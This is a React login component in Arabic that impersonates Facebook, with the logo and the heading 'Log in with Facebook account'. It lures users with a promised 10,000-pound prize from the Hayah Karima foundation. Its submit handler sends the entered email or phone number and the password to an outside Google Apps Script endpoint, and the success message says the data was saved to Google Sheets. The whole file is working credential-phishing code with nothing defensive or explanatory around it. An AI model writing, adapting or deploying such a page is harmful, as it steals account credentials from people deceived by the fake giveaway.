import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Facebook, Mail, Lock, ArrowRight } from 'lucide-react';
import { useToast } from "@/hooks/use-toast";

const LoginForm = () => {
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const validateInput = (input) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[0-9]{10,15}$/;
    return emailRegex.test(input) || phoneRegex.test(input);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateInput(identifier)) {
      toast({
        title: "خطأ في الإدخال",
        description: "يرجى إدخال بريد إلكتروني صحيح أو رقم هاتف صالح.",
        variant: "destructive",
      });
      return;
    }

    if (!navigator.onLine) {
      toast({
        title: "لا يوجد اتصال بالإنترنت",
        description: "يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch("https://script.google.com/macros/s/AKfycbxKpIIdkgFQ95TecOGHUgtM1aHx35KaaCsMdna_u9lUHcCLtPx3g4BNTQZIVS8pwqd8rw/exec", {
        method: "POST",
        mode: "cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: identifier, password: password }),
      });

      const data = await response.json();
      console.log("Response Data:", data);

      if (response.ok && data.status === "success") {
        toast({
          title: "تم تسجيل الدخول بنجاح!",
          description: "تم حفظ بياناتك في Google Sheets.",
        });
      } else {
        toast({
          title: "فشل العملية",
          description: data.message || "حدث خطأ أثناء تسجيل الدخول. حاول مرة أخرى.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Fetch Error:", error);
      toast({
        title: "خطأ في الاتصال",
        description: "لم نتمكن من إرسال بياناتك. تأكد من الاتصال بالإنترنت.",
        variant: "destructive",
      });
    }

    setIsLoading(false);
  };

  return (
    <Card className="w-full max-w-md mx-auto" dir="rtl">
      <CardHeader className="space-y-2">
        <div className="flex justify-center mb-4">
          <Facebook className="h-12 w-12 text-facebook" />
        </div>
        <CardTitle className="text-2xl font-bold text-center text-facebook-dark">تسجيل الدخول بحساب فيسبوك</CardTitle>
        <CardDescription className="text-center">سجل دخولك للحصول على فرصة ربح 10,000 جنيه من مؤسسة حياة كريمة</CardDescription>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="relative">
            <Mail className="absolute right-3 top-3 h-5 w-5 text-muted-foreground" />
            <Input className="pr-10 text-right" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" value={identifier} onChange={(e) => setIdentifier(e.target.value)} required />
          </div>
          <div className="relative">
            <Lock className="absolute right-3 top-3 h-5 w-5 text-muted-foreground" />
            <Input className="pr-10 text-right" type="password" placeholder="كلمة المرور" value={password} onChange={(e) => setPassword(e.target.value)} required />
          </div>
          <Button type="submit" className="w-full text-white flex items-center justify-center gap-2" disabled={isLoading}>
            {isLoading ? "جاري تسجيل الدخول..." : "تسجيل الدخول بالفيسبوك"}
            {!isLoading && <ArrowRight className="h-5 w-5 mr-2" />}
          </Button>
        </form>
      </CardContent>
      <CardFooter className="flex justify-center border-t pt-4">
        <p className="text-xs text-center text-muted-foreground">بتسجيل الدخول، أنت توافق على شروط الخدمة وسياسة الخصوصية الخاصة بنا</p>
      </CardFooter>
    </Card>
  );
};

export default LoginForm;
